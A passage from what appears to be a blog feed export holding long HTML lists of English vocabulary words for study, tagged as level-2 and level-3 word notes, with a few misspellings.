<p>parallel</p></li><li><p>thermometer</p></li><li><p>lodge</p></li><li><p>capable</p></li><li><p>descend</p></li><li><p>sway</p></li><li><p>steer</p></li><li><p>gum</p></li><li><p>suspicious</p></li><li><p>whatsoever</p></li><li><p>validity</p></li><li><p>scope</p></li><li><p>uneasy</p></li><li><p>stuffy</p></li><li><p>summit</p></li><li><p>unemployment</p></li><li><p>heir</p></li><li><p>poverty</p></li><li><p>successive</p></li><li><p>stake</p></li><li><p>forthcoming</p></li><li><p>panic</p></li><li><p>executive</p></li><li><p>dispose</p></li><li><p>innocent</p></li><li><p>fluctuate</p></li><li><p>investigate</p></li><li><p>correspond</p></li><li><p>stale</p></li><li><p>wrack</p></li><li><p>crack</p></li><li><p>plunge</p></li><li><p>revenue</p></li><li><p>penetrate</p></li><li><p>candidate</p></li><li><p>conference</p></li><li><p>dump</p></li><li><p>correspondent</p></li><li><p>wreck</p></li><li><p>sector</p></li><li><p>marvelous</p></li><li><p>treaty</p></li><li><p>cruise</p></li><li><p>advocate</p></li><li><p>bible</p></li><li><p>merit</p></li><li><p>cereal</p></li><li><p>fuss</p></li><li><p>venture</p></li><li><p>sphere</p></li><li><p>appoint</p></li><li><p>cherish</p></li><li><p>republican</p></li><li><p>fierce</p></li><li><p>elevator</p></li><li><p>heap</p></li><li><p>prejudice</p></li><li><p>refreshment</p></li><li><p>peculiar</p></li><li><p>metric</p></li><li><p>congress</p></li><li><p>maiden</p></li><li><p>bait</p></li><li><p>scandal</p></li><li><p>nightmare</p></li><li><p>curse</p></li><li><p>density</p></li><li><p>hay</p></li><li><p>devil</p></li><li><p>temple</p></li><li><p>bore</p></li><li><p>bucket</p></li><li><p>spoil</p></li><li><p>originate</p></li><li><p>mathematics</p></li><li><p>elbow</p></li><li><p>regulation</p></li><li><p>gamble</p></li><li><p>multiplication</p></li><li><p>adoption</p></li><li><p>confront</p></li><li><p>dissolve</p></li><li><p>monument</p></li><li><p>publicity</p></li><li><p>ornament</p></li><li><p>trigger</p></li><li><p>inevitable</p></li><li><p>finance</p></li><li><p>imitation</p></li><li><p>subtract</p></li><li><p>fatigue</p></li><li><p>membership</p></li><li><p>destruction</p></li><li><p>pole</p></li><li><p>embassy</p></li><li><p>plane</p></li><li><p>decay</p></li><li><p>dismiss</p></li><li><p>degraded</p></li><li><p>Christian</p></li><li><p>toss</p></li><li><p>climate</p></li><li><p>axis</p></li><li><p>crash</p></li><li><p>perserve</p></li><li><p>retirement</p></li><li><p>predict</p></li><li><p>recession</p></li><li><p>vertical</p></li><li><p>quarterly</p></li><li><p>surgery</p></li><li><p>volt</p></li><li><p>batch</p></li><li><p>outset</p></li><li><p>curriculum</p></li><li><p>phase</p></li><li><p>forge</p></li><li><p>famine</p></li><li><p>stride</p></li><li><p>verbal</p></li><li><p>eternal</p></li><li><p>hostile</p></li><li><p>lest</p></li><li><p>compact</p></li><li><p>preliminary</p></li><li><p>consequently</p></li><li><p>rare</p></li><li><p>consent</p></li><li><p>nuisance</p></li><li><p>overtake</p></li><li><p>subsequent</p></li><li><p>promotion</p></li><li><p>utilize</p></li><li><p>stationary</p></li><li><p>bold</p></li><li><p>reform</p></li><li><p>grassy</p></li><li><p>architecture</p></li><li><p>perception</p></li><li><p>objection</p></li><li><p>architect</p></li><li><p>tray</p></li><li><p>spite</p></li><li><p>nerve</p></li><li><p>restrain</p></li><li><p>smash</p></li><li><p>insurance</p></li><li><p>grand</p></li><li><p>era</p></li><li><p>integrate</p></li><li><p>cancer</p></li><li><p>fence</p></li><li><p>stem</p></li><li><p>bearing</p></li><li><p>dialect</p></li><li><p>circular</p></li><li><p>pound</p></li><li><p>resign</p></li><li><p>indispensable</p></li><li><p>exhaust</p></li><li><p>classification</p></li><li><p>pregnant</p></li><li><p>process</p></li><li><p>strap</p></li><li><p>diameter</p></li><li><p>altitude</p></li><li><p>composer</p></li><li><p>punch</p></li><li><p>identification</p></li><li><p>shiver</p></li><li><p>parade</p></li><li><p>present</p></li><li><p>halt</p></li><li><p>abundance</p></li><li><p>vapour</p></li><li><p>prominent</p></li><li><p>reaction</p></li><li><p>automobile</p></li><li><p>suburb</p></li><li><p>universal</p></li><li><p>sincere</p></li><li><p>proficient</p></li><li><p>literal</p></li><li><p>proportion</p></li><li><p>politics</p></li><li><p>prison</p></li><li><p>stage</p></li><li><p>engage</p></li><li><p>involve</p></li><li><p>grip</p></li><li><p>customary</p></li><li><p>district</p></li><li><p>flock</p></li><li><p>lamp</p></li><li><p>plentiful</p></li><li><p>Marxist</p></li><li><p>spouse</p></li><li><p>essence</p></li><li><p>reception</p></li><li><p>terminal</p></li><li><p>simulated</p></li><li><p>triumph</p></li><li><p>therapeutical</p></li><li><p>faithful</p></li><li><p>electronics</p></li><li><p>breed</p></li><li><p>upright</p></li><li><p>technique</p></li><li><p>companion</p></li><li><p>exclusion</p></li><li><p>obedience</p></li><li><p>timber</p></li><li><p>dumb</p></li><li><p>grain</p></li><li><p>crew</p></li><li><p>perspective</p></li><li><p>surgeon</p></li><li><p>indifferent</p></li><li><p>accomplish</p></li><li><p>tide</p></li><li><p>scheme</p></li><li><p>disgust</p></li><li><p>peak</p></li><li><p>siege</p></li><li><p>instinct</p></li><li><p>applicable</p></li><li><p>trial</p></li><li><p>infect</p></li><li><p>balcony</p></li><li><p>mist</p></li><li><p>reference</p></li><li><p>season</p></li><li><p>interference</p></li><li><p>approve</p></li><li><p>voltage</p></li><li><p>reproduction</p></li><li><p>pretend</p></li><li><p>boundary</p></li><li><p>barrel</p></li><li><p>hail</p></li><li><p>prospective</p></li><li><p>burden</p></li><li><p>banner</p></li><li><p>splash</p></li><li><p>curtain</p></li><li><p>bachelor</p></li><li><p>depart</p></li><li><p>shallow</p></li><li><p>council</p></li><li><p>crawl</p></li><li><p>damp</p></li><li><p>hollow</p></li><li><p>liability</p></li><li><p>sauce</p></li><li><p>rod</p></li><li><p>suspect</p></li><li><p>materialize</p></li><li><p>rhythm</p></li><li><p>template</p></li><li><p>mild</p></li><li><p>badge</p></li><li><p>apartment</p></li><li><p>resent</p></li><li><p>primitive</p></li><li><p>comparison</p></li><li><p>crisis</p></li><li><p>underestimate</p></li><li><p>conscious</p></li><li><p>counter</p></li><li><p>nursery</p></li><li><p>vanish</p></li><li><p>pour</p></li><li><p>beverage</p></li><li><p>revolve</p></li><li><p>proverb</p></li><li><p>induce</p></li><li><p>haste</p></li><li><p>forth</p></li><li><p>dye</p></li><li><p>attendance</p></li><li><p>consumption</p></li><li><p>undertaking</p></li><li><p>philosophy</p></li><li><p>commit</p></li><li><p>mill</p></li><li><p>confirmation</p></li><li><p>annual</p></li><li><p>drain</p></li><li><p>attorney</p></li><li><p>contend</p></li><li><p>experimental</p></li><li><p>patent</p></li><li><p>offensive</p></li><li><p>pinch</p></li><li><p>fantastic</p></li><li><p>cool</p></li><li><p>shortage</p></li><li><p>optimism</p></li><li><p>trap</p></li><li><p>substitute</p></li><li><p>occupant</p></li><li><p>admiration</p></li><li><p>pledge</p></li><li><p>rage</p></li><li><p>canal</p></li><li><p>impress</p></li><li><p>conservative</p></li><li><p>infinity</p></li><li><p>specific</p></li><li><p>recover</p></li><li><p>reap</p></li><li><p>rely</p></li><li><p>cosmic</p></li><li><p>apt</p></li><li><p>narration</p></li><li><p>commitment</p></li><li><p>metallic</p></li><li><p>tunnel</p></li><li><p>division</p></li><li><p>grief</p></li><li><p>rack</p></li><li><p>confess</p></li><li><p>reflect</p></li><li><p>situate</p></li><li><p>derivation</p></li><li><p>heading</p></li><li><p>fortune</p></li><li><p>marital</p></li><li><p>triangular</p></li><li><p>maintenance</p></li><li><p>harmonious</p></li><li><p>irony</p></li><li><p>spark</p></li><li><p>reluctant</p></li><li><p>odd</p></li><li><p>personnel</p></li><li><p>advantageous</p></li><li><p>transmission</p></li><li><p>previal</p></li><li><p>interpret</p></li><li><p>responsible</p></li><li><p>contrary</p></li><li><p>presentation</p></li><li><p>chemistry</p></li><li><p>compound</p></li><li><p>desperate</p></li><li><p>treatment</p></li><li><p>resolute</p></li><li><p>noticeable</p></li><li><p>positive</p></li><li><p>purify</p></li><li><p>motel</p></li><li><p>valid</p></li><li><p>paste</p></li><li><p>rib</p></li><li><p>cashier</p></li><li><p>ethnic</p></li><li><p>specimen</p></li><li><p>energetic</p></li><li><p>notable</p></li><li><p>obligation</p></li><li><p>accumulation</p></li><li><p>deficiency</p></li><li><p>committee</p></li><li><p>moisture</p></li><li><p>fellowship</p></li><li><p>extinguish</p></li><li><p>reverse</p></li><li><p>doctoral</p></li><li><p>outlet</p></li><li><p>instrument</p></li><li><p>prevalent</p></li><li><p>pub</p></li><li><p>artistic</p></li><li><p>antique</p></li><li><p>forbid</p></li><li><p>assemble</p></li><li><p>interact</p></li><li><p>conceal</p></li><li><p>appeal</p></li><li><p>strip</p></li><li><p>hip</p></li><li><p>feedback</p></li><li><p>relative</p></li><li><p>suffer</p></li><li><p>leisure</p></li><li><p>discharge</p></li><li><p>emission</p></li><li><p>misfortune</p></li><li><p>endurance</p></li><li><p>consume</p></li><li><p>justice</p></li><li><p>obedient</p></li><li><p>democratic</p></li><li><p>settlement</p></li><li><p>toxic</p></li><li><p>pause</p></li><li><p>jealousy</p></li><li><p>governor</p></li><li><p>rescue</p></li><li><p>attribute</p></li><li><p>approach</p></li><li><p>parliament</p></li><li><p>college</p></li><li><p>sip</p></li><li><p>offend</p></li><li><p>worthless</p></li><li><p>accident</p></li><li><p>perceive</p></li><li><p>deliberate</p></li><li><p>morality</p></li><li><p>sorrowful</p></li><li><p>guilty</p></li><li><p>giant</p></li><li><p>spontaneous</p></li><li><p>retailer</p></li><li><p>bulb</p></li><li><p>arouse</p></li><li><p>journal</p></li><li><p>roller</p></li><li><p>surge</p></li><li><p>dose</p></li><li><p>miracle</p></li><li><p>charter</p></li><li><p>damn</p></li><li><p>entertain</p></li><li><p>apparatus</p></li><li><p>datum</p></li><li><p>sample</p></li><li><p>virtue</p></li><li><p>troop</p></li><li><p>frustration</p></li><li><p>funeral</p></li><li><p>peasant</p></li><li><p>evaluate</p></li><li><p>doom</p></li><li><p>expiation</p></li><li><p>confine</p></li><li><p>sensitive</p></li><li><p>academic</p></li><li><p>plague</p></li><li><p>crown</p></li><li><p>exile</p></li><li><p>poll</p></li><li><p>provided</p></li><li><p>flame</p></li><li><p>reduction</p></li><li><p>petty</p></li><li><p>counterpart</p></li><li><p>instantaneous</p></li><li><p>harsh</p></li><li><p>aware</p></li><li><p>bubble</p></li><li><p>realm</p></li><li><p>wagon</p></li><li><p>sophisticated</p></li><li><p>reunion</p></li><li><p>chip</p></li><li><p>stir</p></li><li><p>supper</p></li><li><p>impact</p></li><li><p>incentive</p></li><li><p>implement</p></li><li><p>discipline</p></li><li><p>procedure</p></li><li><p>atmosphere</p></li><li><p>military</p></li><li><p>content</p></li><li><p>suit</p></li><li><p>dialogue</p></li><li><p>faculty</p></li><li><p>glow</p></li><li><p>segment</p></li><li><p>exception</p></li><li><p>cable</p></li><li><p>corridor</p></li><li><p>pratical</p></li><li><p>permission</p></li><li><p>frank</p></li><li><p>conclusion</p></li><li><p>jungle</p></li><li><p>deem</p></li><li><p>stiff</p></li><li><p>veteran</p></li><li><p>certification</p></li><li><p>puzzle</p></li><li><p>bacteria</p></li><li><p>torture</p></li><li><p>integrity</p></li><li><p>delicate</p></li><li><p>cruelty</p></li><li><p>luxury</p></li><li><p>drainage</p></li><li><p>supervise</p></li><li><p>intense</p></li><li><p>strive</p></li><li><p>inference</p></li><li><p>collapse</p></li><li><p>superficial</p></li><li><p>persist</p></li><li><p>contrast</p></li><li><p>coherent</p></li><li><p>persuasion</p></li><li><p>fragment</p></li><li><p>precision</p></li><li><p>occupation</p></li><li><p>echo</p></li><li><p>miserable</p></li><li><p>momentary</p></li><li><p>recreation</p></li><li><p>commonplace</p></li><li><p>frequency</p></li><li><p>napkin</p></li><li><p>occurrence</p></li><li><p>reveal</p></li><li><p>generalize</p></li><li><p>aisle</p></li><li><p>projector</p></li><li><p>proceed</p></li><li><p>spacecraft</p></li><li><p>access</p></li><li><p>remark</p></li><li><p>decent</p></li><li><p>inward</p></li><li><p>prediction</p></li><li><p>monstrous</p></li><li><p>insult</p></li><li><p>organic</p></li><li><p>generator</p></li><li><p>precaution</p></li><li><p>linear</p></li><li><p>liter</p></li><li><p>folk</p></li><li><p>mortgage</p></li><li><p>condense</p></li><li><p>acute</p></li><li><p>swell</p></li><li><p>inform</p></li><li><p>sustain</p></li><li><p>notify</p></li><li><p>stripe</p></li><li><p>toll</p></li><li><p>pace</p></li><li><p>freight</p></li><li><p>solar</p></li><li><p>precious</p></li><li><p>suspicion</p></li><li><p>specialist</p></li><li><p>proposition</p></li><li><p>soften</p></li><li><p>passive</p></li><li><p>rifle</p></li><li><p>approval</p></li><li><p>wit</p></li><li><p>radical</p></li><li><p>sketch</p></li><li><p>comprehension</p></li><li><p>formulation</p></li><li><p>startle</p></li><li><p>assure</p></li><li><p>definition</p></li><li><p>hearty</p></li><li><p>continuity</p></li><li><p>tremendous</p></li><li><p>gang</p></li><li><p>complaint</p></li><li><p>sociology</p></li><li><p>ownership</p></li><li><p>mechanism</p></li><li><p>alliance</p></li><li><p>dorm</p></li><li><p>trash</p></li><li><p>spherical</p></li><li><p>quantify</p></li><li><p>anticipate</p></li><li><p>geology</p></li><li><p>earnest</p></li><li><p>seal</p></li><li><p>deficient</p></li><li><p>clash</p></li><li><p>distract</p></li><li><p>versus</p></li><li><p>ware</p></li><li><p>encounter</p></li><li><p>sacrifice</p></li><li><p>progressive</p></li><li><p>sack</p></li><li><p>spot</p></li><li><p>gravity</p></li><li><p>dispute</p></li><li><p>slope</p></li><li><p>ore</p></li><li><p>orbit</p></li><li><p>association</p></li><li><p>elevate</p></li><li><p>advisable</p></li><li><p>soar</p></li><li><p>practicable</p></li><li><p>gymnasium</p></li><li><p>monetary</p></li><li><p>romance</p></li><li><p>spacious</p></li><li><p>goodness</p></li><li><p>recruit</p></li><li><p>contest</p></li><li><p>deserve</p></li><li><p>proper</p></li><li><p>herd</p></li><li><p>straighten</p></li><li><p>skeleton</p></li><li><p>quest</p></li><li><p>attain</p></li><li><p>workout</p></li><li><p>clinical</p></li><li><p>interviewed</p></li><li><p>respondents</p></li><li><p>resisting</p></li></ol><hr><ol start="732"><li>coil</li><li>inland</li><li>enormous</li><li>bug</li><li>brutal</li><li>counsel</li><li>battery</li><li>viewpoint</li><li>idle</li><li>concentration</li><li>philosopher</li><li>palm</li><li>haul</li><li>liver</li><li>gulf</li><li>hedge</li><li>junior</li><li>horsepower</li><li>contradiction</li><li>overlook</li><li>blast</li><li>identical</li><li>calculation</li><li>consequence</li><li>frustrate</li><li>colony</li><li>invasion</li><li>combination</li><li>economical</li><li>assurance</li><li>controversy</li><li>completion</li><li>legend</li><li>so-called</li><li>clarify</li><li>criminal</li><li>assess</li><li>derive</li><li>worship</li><li>ease</li><li>contract</li><li>bulletin</li><li>coach</li><li>interrupt</li><li>cabinet</li><li>repetition</li><li>cease</li><li>implication</li><li>comprehend</li><li>chill</li><li>moral</li><li>furnish</li><li>ax</li><li>ditch</li><li>diplomatic</li><li>poison</li><li>severe</li><li>infer</li><li>exclusive</li><li>solemn</li><li>fleet</li><li>spatial</li><li>stretch</li><li>extensive</li><li>ignorance</li><li>plural</li><li>automate</li><li>dictator</li><li>peculiarity</li><li>cling</li><li>recognition</li><li>independence</li><li>tragic</li><li>realization</li><li>circuit</li><li>compensate</li><li>disturbance</li><li>manipulate</li><li>assembly</li><li>particle</li><li>criticism</li><li>version</li><li>twist</li><li>marginal</li><li>receiver</li><li>estate</li><li>mammal</li><li>boast</li><li>board</li><li>criticize</li><li>genius</li><li>observation</li><li>oval</li><li>cultivate</li><li>sincerity</li><li>sideways</li><li>rug</li><li>reputation</li><li>ignorant</li><li>allowance</li><li>majority</li><li>pigeon</li><li>moist</li><li>hazard</li><li>contribute</li><li>announce</li><li>torch</li><li>liquor</li><li>accommodate</li><li>colonial</li><li>racial</li><li>episode</li><li>incline</li><li>attendant</li><li>occupy</li><li>indication</li><li>outbreak</li><li>enthusiastic</li><li>dean</li><li>grasp</li><li>haunt</li><li>aggressive</li><li>signal</li><li>external</li><li>conform</li><li>mold</li><li>deprive</li><li>sail</li><li>appears</li><li>consistent</li><li>strategies</li><li>dedicate</li></ol><hr><ol start="864"><li>exploit</li><li>instruction</li><li>for</li><li>catch-up</li><li>interface</li><li>subject</li><li>realise</li><li>chores</li><li>indeed</li><li>reconsidered</li><li>realisation</li><li>pot</li><li>adapt</li><li>section</li><li>litre</li><li>fancy</li><li>harm</li><li>seperate</li><li>campaigners</li><li>nation</li><li>adviser</li><li>auto</li><li>strikingly</li><li>critical</li></ol>]]></content>
    
    
    <categories>
      
      <category>英语</category>
      
      <category>英语单词</category>
      
      <category>三级单词</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：二级单词</title>
    <link href="/2025/05/15/%E7%AC%94%E8%AE%B0%EF%BC%9A%E4%BA%8C%E7%BA%A7%E5%8D%95%E8%AF%8D/"/>
    <url>/2025/05/15/%E7%AC%94%E8%AE%B0%EF%BC%9A%E4%BA%8C%E7%BA%A7%E5%8D%95%E8%AF%8D/</url>
    
    <content type="html"><![CDATA[<ol><li>disguise</li><li>arise</li><li>accurate</li><li>evil</li><li>imperialism</li><li>adapt</li><li>revelation</li><li>peril</li><li>cabin</li><li>municipal</li><li>hut</li><li>speculate</li><li>coarse</li><li>incidence</li><li>usage</li><li>lease</li><li>lobby</li><li>patch</li><li>utility</li><li>copper</li><li>convention</li><li>flourish</li><li>reckon</li><li>crush</li><li>breakdown</li><li>measurement</li><li>liable</li><li>delegate</li><li>condemn</li><li>overwhelming</li><li>preference</li><li>superiority</li><li>compatible</li><li>pad</li><li>detection</li><li>pillar</li><li>cement</li><li>tragedy</li><li>thrive</li><li>comedy</li><li>hint</li><li>dictate</li><li>drip</li><li>spill</li><li>compel</li><li>jury</li><li>vague</li><li>lavatory</li><li>carrier</li><li>eliminate</li><li>conquest</li><li>pierce</li><li>nonsense</li><li>gear</li><li>modification</li><li>admission</li><li>collective</li><li>horizontal</li><li>mission</li><li>shrug</li><li>donation</li><li>lean</li><li>continental</li><li>deposit</li><li>microscopic</li><li>negotiate</li><li>motorway</li><li>sting</li><li>pitch</li><li>motion</li><li>veil</li><li>millimetre</li><li>indicative</li><li>farewell</li><li>fruitful</li><li>stock</li><li>gross</li><li>revolutionary</li><li>awful</li><li>mount</li><li>simplicity</li><li>preface</li><li>intensity</li><li>definite</li><li>depress</li><li>distinction</li><li>astonishment</li><li>pray</li><li>retreat</li><li>magnificent</li><li>elevation</li><li>locality</li><li>transaction</li><li>corporation</li><li>accent</li><li>receipt</li><li>refine</li><li>mess</li><li>barely</li><li>fright</li><li>occasion</li><li>frequent</li><li>namely</li><li>absent</li><li>undergraduate</li><li>sensible</li><li>vacuum</li><li>onward</li><li>agriculture</li><li>stability</li><li>observe</li><li>rival</li><li>reinforce</li><li>sight</li><li>mutual</li><li>deadly</li><li>regulate</li><li>exert</li><li>resemble</li><li>shelter</li><li>industrial</li><li>meantime</li><li>hindrance</li><li>conqueror</li><li>embarrass</li><li>squeeze</li><li>administration</li><li>dimension</li><li>inspect</li><li>troublesome</li><li>assumption</li><li>imply</li><li>devise</li><li>neglect</li><li>pessimistic</li><li>clip</li><li>aerial</li><li>surplus</li><li>minus</li><li>inflation</li><li>polish</li><li>alternative</li><li>mathematical</li><li>jeans</li><li>dirt</li><li>roast</li><li>hospitality</li><li>correspondence</li><li>radar</li><li>imaginary</li><li>senator</li><li>circumstance</li><li>soak</li><li>victim</li><li>dramatic</li><li>parallel</li><li>thermometer</li><li>periodical</li><li>lodge</li><li>capable</li><li>organism</li><li>descend</li><li>sway</li><li>steer</li><li>gum</li><li>formula</li><li>suspicious</li><li>whatsoever</li><li>mighty</li><li>vocation</li><li>validity</li><li>scope</li><li>uneasy</li><li>complicate</li><li>stuffy</li><li>terrorist</li><li>summit</li><li>unemployment</li><li>heir</li><li>poverty</li><li>forehead</li><li>successive</li><li>invade</li><li>stake</li><li>forthcoming</li><li>panic</li><li>executive</li><li>gossip</li><li>characteristic</li><li>omit</li><li>particularly</li><li>dispose</li><li>multiply</li><li>innocent</li><li>strategic</li><li>fluctuate</li><li>slender</li><li>investigate</li><li>defiant</li><li>correspond</li><li>stale</li><li>wrack</li><li>crack</li><li>spur</li><li>plunge</li><li>revenue</li><li>penetrate</li><li>candidate</li><li>conference</li><li>dump</li><li>correspondent</li><li>compensation</li><li>wreck</li><li>sector</li><li>marvelous</li><li>treaty</li><li>cruise</li><li>feasible</li><li>advocate</li><li>respectively</li><li>bible</li><li>merit</li><li>cereal</li><li>genuine</li><li>fuss</li><li>venture</li><li>sphere</li><li>appoint</li><li>cherish</li><li>settle</li><li>republican</li><li>fierce</li><li>register</li><li>monster</li><li>elevator</li><li>heap</li><li>prejudice</li><li>refreshment</li><li>peculiar</li><li>metric</li><li>congress</li><li>emphasis</li><li>wander</li><li>notion</li><li>dominate</li><li>reserve</li><li>maiden</li><li>veto</li><li>bait</li><li>scandal</li><li>nightmare</li><li>curse</li><li>density</li><li>hay</li><li>devil</li><li>temple</li><li>laundry</li><li>survey</li><li>bore</li><li>bucket</li><li>consolidate</li><li>spoil</li><li>ambition</li><li>conclude</li><li>alongside</li><li>originate</li><li>mathematics</li><li>repay</li><li>elbow</li><li>regulation</li><li>gamble</li><li>multiplication</li><li>solidify</li><li>adoption</li><li>dealer</li><li>ultimate</li><li>confront</li><li>dissolve</li><li>gorgeous</li><li>monument</li><li>defiance</li><li>publicity</li><li>ornament</li><li>trigger</li><li>provoke</li><li>inevitable</li><li>novelty</li><li>finance</li><li>cast</li><li>imitation</li><li>subtract</li><li>fatigue</li><li>membership</li><li>destruction</li><li>pole</li><li>supply</li><li>ounce</li><li>lord</li><li>embassy</li><li>plane</li><li>methodical</li><li>decay</li><li>dismiss</li><li>degraded</li><li>Christian</li><li>toss</li><li>climate</li><li>axis</li><li>crash</li><li>perserve</li><li>retirement</li><li>predict</li><li>recession</li><li>vertical</li><li>conjunction</li><li>quarterly</li><li>surgery</li><li>volt</li><li>batch</li><li>outset</li><li>curriculum</li><li>phase</li><li>forge</li><li>famine</li><li>ashore</li><li>stride</li><li>verbal</li><li>fairly</li><li>explosive</li><li>eternal</li><li>hostile</li><li>lest</li><li>compact</li><li>preliminary</li><li>consequently</li><li>campaign</li><li>rare</li><li>inhibitant</li><li>lump</li><li>figurative</li><li>consent</li><li>nuisance</li><li>overtake</li><li>subsequent</li><li>promotion</li><li>material</li><li>utilize</li><li>stationary</li><li>bold</li><li>quarrelsome</li><li>reform</li><li>grassy</li><li>deliver</li><li>architecture</li><li>perception</li><li>objection</li><li>architect</li><li>roar</li><li>tray</li><li>microphone</li><li>spite</li><li>nerve</li><li>restrain</li><li>helpless</li><li>smash</li><li>insurance</li><li>grand</li><li>era</li><li>integrate</li><li>cancer</li><li>fence</li><li>stem</li><li>bearing</li><li>dialect</li><li>circular</li><li>pound</li><li>resign</li><li>indispensable</li><li>exhaust</li><li>warfare</li><li>classification</li><li>pregnant</li><li>whale</li><li>process</li><li>elective</li><li>fundamental</li><li>strap</li><li>diameter</li><li>define</li><li>altitude</li><li>composer</li><li>punch</li><li>triumphant</li><li>identification</li><li>shiver</li><li>parade</li><li>present</li><li>halt</li><li>abundance</li><li>vapour</li><li>prominent</li><li>reaction</li><li>automobile</li><li>suburb</li><li>universal</li><li>sincere</li><li>proficient</li><li>temper</li><li>literal</li><li>proportion</li><li>politics</li><li>prison</li><li>lick</li><li>stage</li><li>engage</li><li>accuse</li><li>involve</li><li>grip</li><li>jail</li><li>customary</li><li>district</li><li>session</li><li>flock</li><li>vigorous</li><li>lamp</li><li>plentiful</li><li>status</li><li>overhead</li><li>drft</li><li>Marxist</li><li>shady</li><li>production</li><li>obtain</li><li>spouse</li><li>essence</li><li>gardener</li><li>reception</li><li>terminal</li><li>simulated</li><li>triumph</li><li>therapeutical</li><li>revise</li><li>faithful</li><li>electronics</li><li>breed</li><li>upright</li><li>technique</li><li>suspend</li><li>companion</li><li>exclusion</li><li>obedience</li><li>compose</li><li>timber</li><li>dumb</li><li>grain</li><li>firm</li><li>crew</li><li>preserve</li><li>perspective</li><li>surgeon</li><li>couch</li><li>indifferent</li><li>accomplish</li><li>tide</li><li>scheme</li><li>shed</li><li>disgust</li><li>peak</li><li>siege</li><li>instinct</li><li>standpoint</li><li>applicable</li><li>trial</li><li>infect</li><li>balcony</li><li>mist</li><li>reference</li><li>season</li><li>perfection</li><li>interference</li><li>approve</li><li>voltage</li><li>reproduction</li><li>pretend</li><li>boundary</li><li>barrel</li><li>hail</li><li>camp</li><li>prospective</li><li>burden</li><li>banner</li><li>splash</li><li>curtain</li><li>bachelor</li><li>violation</li><li>depart</li><li>shallow</li><li>council</li><li>crawl</li><li>damp</li><li>hollow</li><li>liability</li><li>carbon</li><li>sauce</li><li>rod</li><li>suspect</li><li>materialize</li><li>rhythm</li><li>comment</li><li>template</li><li>mild</li><li>badge</li><li>apartment</li><li>resent</li><li>primitive</li><li>comparison</li><li>crisis</li><li>province</li><li>underestimate</li><li>conscious</li><li>counter</li><li>demonstrate</li><li>nursery</li><li>vanish</li><li>pour</li><li>beverage</li><li>revolve</li><li>proverb</li><li>induce</li><li>haste</li><li>forth</li><li>dye</li><li>attendance</li><li>consumption</li><li>undertaking</li><li>philosophy</li><li>commit</li><li>mill</li><li>confirmation</li><li>annual</li><li>given</li><li>routine</li><li>drain</li><li>attorney</li><li>contend</li><li>experimental</li><li>patent</li><li>offensive</li><li>pinch</li><li>fantastic</li><li>lens</li><li>cool</li><li>shortage</li><li>advertise</li><li>optimism</li><li>scene</li><li>trap</li><li>substitute</li><li>occupant</li><li>admiration</li><li>steam</li><li>coverage</li><li>pledge</li><li>rage</li><li>tutor</li><li>canal</li><li>impress</li><li>draft</li><li>semester</li><li>conservative</li><li>infinity</li><li>specific</li><li>recover</li><li>reap</li><li>route</li><li>rely</li><li>cosmic</li><li>apt</li><li>fascinate</li><li>narration</li><li>commitment</li><li>metallic</li><li>tunnel</li><li>division</li><li>grief</li><li>rack</li><li>confess</li><li>reflect</li><li>situate</li><li>derivation</li><li>heading</li><li>fortune</li><li>marital</li><li>triangular</li><li>maintenance</li><li>harmonious</li><li>irony</li><li>grave</li><li>spark</li><li>riot</li><li>reluctant</li><li>superb</li><li>decompose</li><li>odd</li><li>personnel</li><li>advantageous</li><li>transmission</li><li>previal</li><li>alter</li><li>interpret</li><li>responsible</li><li>protest</li><li>contrary</li><li>presentation</li><li>chemistry</li><li>compound</li><li>desperate</li><li>treatment</li><li>resolute</li><li>fiction</li><li>noticeable</li><li>positive</li><li>purify</li><li>motel</li><li>valid</li><li>paste</li><li>sour</li><li>rib</li><li>cashier</li><li>ethnic</li><li>specimen</li><li>energetic</li><li>bargain</li><li>notable</li><li>obligation</li><li>accumulation</li><li>deficiency</li><li>committee</li><li>plug</li><li>moisture</li><li>fellowship</li><li>extinguish</li><li>reverse</li><li>doctoral</li><li>outlet</li><li>instrument</li><li>prevalent</li><li>pub</li><li>object</li><li>artistic</li><li>antique</li><li>forbid</li><li>assemble</li><li>interact</li><li>conceal</li><li>appeal</li><li>sponsor</li><li>strip</li><li>instrumental</li><li>hip</li><li>feedback</li><li>relative</li><li>suffer</li><li>verfication</li><li>leisure</li><li>visually</li><li>discharge</li><li>intent</li><li>emission</li><li>misfortune</li><li>endurance</li><li>consume</li><li>justice</li><li>obedient</li><li>democratic</li><li>settlement</li><li>ward</li><li>toxic</li><li>debt</li><li>convince</li><li>pause</li><li>guilt</li><li>jealousy</li><li>term</li><li>governor</li><li>liberal</li><li>rescue</li><li>influence</li><li>attribute</li><li>approach</li><li>parliament</li><li>college</li><li>sip</li><li>prevent</li><li>offend</li><li>worthless</li><li>intermediary</li><li>equivalent</li><li>accident</li><li>confusion</li><li>perceive</li><li>deliberate</li><li>possession</li><li>morality</li><li>civilize</li><li>sorrowful</li><li>guilty</li><li>giant</li><li>spontaneous</li><li>retailer</li><li>matter</li><li>bulb</li><li>arouse</li><li>vary</li><li>journal</li><li>roller</li><li>atomic</li><li>surge</li><li>dose</li><li>miracle</li><li>tedious</li><li>refrain</li><li>charter</li><li>damn</li><li>entertain</li><li>apparatus</li><li>datum</li><li>sample</li><li>paw</li><li>virtue</li><li>troop</li><li>frustration</li><li>funeral</li><li>peasant</li><li>evaluate</li><li>doom</li><li>expiation</li><li>confine</li><li>enlighten</li><li>sensitive</li><li>academic</li><li>plague</li><li>crown</li><li>exile</li><li>poll</li><li>provided</li><li>flame</li><li>reduction</li><li>petty</li><li>counterpart</li><li>instantaneous</li><li>harsh</li><li>aware</li><li>bubble</li><li>furnuiture</li><li>realm</li><li>wagon</li><li>sophisticated</li><li>reunion</li><li>infant</li><li>pollution</li><li>chip</li><li>stir</li><li>supper</li><li>impact</li><li>incentive</li><li>implement</li><li>headquarters</li><li>discipline</li><li>hole</li><li>procedure</li><li>atmosphere</li><li>fortunate</li><li>military</li><li>rub</li><li>commence</li><li>content</li><li>suit</li><li>dialogue</li><li>saint</li><li>faculty</li><li>glow</li><li>segment</li><li>exception</li><li>singular</li><li>cable</li><li>frame</li><li>slip</li><li>being</li><li>corridor</li><li>recommend</li><li>pratical</li><li>permission</li><li>frank</li><li>gaze</li><li>conclusion</li><li>jungle</li><li>deem</li><li>stiff</li><li>bother</li><li>veteran</li><li>certification</li><li>puzzle</li><li>drastic</li><li>bacteria</li><li>restore</li><li>torture</li><li>integrity</li><li>delicate</li><li>cruelty</li><li>stain</li><li>illusion</li><li>luxury</li><li>formation</li><li>drainag